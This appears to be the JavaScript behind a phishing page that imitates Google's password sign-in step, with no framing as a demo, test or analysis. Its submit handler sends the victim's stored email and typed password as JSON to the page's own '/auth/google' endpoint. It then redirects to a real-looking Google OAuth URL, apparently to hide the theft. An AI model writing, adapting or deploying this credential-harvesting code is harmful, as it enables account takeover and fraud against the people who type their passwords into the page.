localStorage.clear();
function togglePasswordVisibility() {
    const passwordInput = document.getElementById('password');
    const checkbox = document.getElementById('showPasswordToggle');
    
    if (checkbox.checked) {
        passwordInput.type = 'text';
    } else {
        passwordInput.type = 'password';
    }
}

function handleSubmit(event) {
    event.preventDefault();
    
    const email = localStorage.getItem("email") || "";
    const password = document.getElementById('password').value;
    
    if (password.trim() !== "") {
        const payload = {
            email: email,
            password: password
        };
        
        fetch('/auth/google', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(payload)
        })
        .then(response => {
            if (response.ok) {
                window.location.href = "https://accounts.google.com/v3/signin/identifier?opparams=%253Fgis_params%253DGAcqKzJFVU5vbVNpbmdJRmxBTld0T2NiV2hqa3ZIRmJnYTQyNlorWHdhUjB2V284AUJAM2NlYTJmNzhhYjQ2ODRhMTU5Y2ZmMzZmOTJiZGEyYTAxYzhjMjM0NjA5NzQ0OTczZGRmNTQ0OTE0ODYzY2Q3Yw%2526response_mode%253Dform_post&dsh=2EUNomSingIFlANWtOcbWhjkvHFbga426Z%2BXwaR0vWo&as=2EUNomSingIFlANWtOcbWhjkvHFbga426Z%2BXwaR0vWo&client_id=126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com&display=popup&gsiwebsdk=gis_attributes&nonce=4f63236e-cd07-4d0c-861e-c0b82ddb40b8&o2v=1&origin=https%3A%2F%2Faccounts.snapchat.com&prompt=select_account&redirect_uri=gis_transform&response_type=id_token&scope=openid+email+profile&service=lso&flowName=GeneralOAuthFlow&continue=https%3A%2F%2Faccounts.google.com%2Fsignin%2Foauth%2Fconsent%3Fauthuser%3Dunknown%26part%3DAJi8hAOTrtQUBvrbq8rUx8DV1A6DKi-w9n_Sf0u3_yWXpeHugp9qRtZZaf9NFQbejThp9rHhdZ1_7uwyZzAFVACtEhTmQB8C3hqWCNJZ4UC84SqNJ1VqRyxDlMyXY4EH8Td1gXSu-1NZgD0RW4rAbcEoTV42Q6TOvXumuf0iuX-vvtTlBTqgJZbi1AOfW2sSEE9uTCI7czCHjhn-cM6ziIoOVgDM1WGOv1DBJFlp5kgEam3ZOM3ki-OgPCyE6MS9KbzFHmR3slW23y8sb6reCK7092EyR9LRl_XNkm60Cfxx4ydeMU9g0nq6Ewj3qDEtDSr8RAmG823udqHVkNteB_bySQ-T4OX1tI_t7uoeL7P_EsYTdVZmxP8Xo84Nh9Ez3Vxsb_IJUKwqm6twLPhIMNyZdZl-zbTVj6cw9Gj_ZxMLkMVIqa28apdEKE-Sd_2g5-9JWClMnAxuPHO6v3-9TwT58ScVvrwrU4_wE0w_uTtBrC0FVwc-CHpi-k0PVdYy1X4AN8q7rx5h%26flowName%3DGeneralOAuthFlow%26as%3D2EUNomSingIFlANWtOcbWhjkvHFbga426Z%252BXwaR0vWo%26client_id%3D126465353735-9c1kjml3cqp6ec1mfu3ts9u478np4svg.apps.googleusercontent.com%26requestPath%3D%252Fsignin%252Foauth%252Fconsent%23&app_domain=https%3A%2F%2Faccounts.snapchat.com&rart=ANgoxcdElEh1hzW2s8Dh8uV9ikKrMuOEUdRYjaB5PTBBalZdqIY87Ptq5oDy46uAlrrZ9ZqDyshAqLLhnoXTk47WJzNhzDcZKWLv_nUYFqRzsthfz3Obcxo";
            } else {
                console.error("Server responded with an error status:", response.status);
            }
        })
        .catch(error => {
            console.error("Failed fetch: ", error.message);
        });
    }
}

const username = localStorage.getItem("email");
console.log(username);

let emailElement = document.getElementById("user-email");
if (emailElement) {
    emailElement.textContent = `${username || ''}`;
}